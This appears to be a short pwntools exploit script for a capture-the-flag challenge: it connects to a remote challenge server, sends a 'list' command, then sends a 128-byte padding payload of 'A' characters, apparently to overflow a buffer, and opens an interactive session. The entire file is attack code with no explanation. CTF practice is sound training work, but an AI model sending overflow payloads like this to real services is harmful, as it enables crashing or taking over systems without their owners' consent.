from pwn import * 
import struct

qq =  b'A' * (77+51)

context(arch = 'i386', os = 'linux')
r = remote('ctf.adl.tw', 11007)
r.sendline("list")
r.recv()
r.sendline(qq)
print(r.recv())
r.interactive()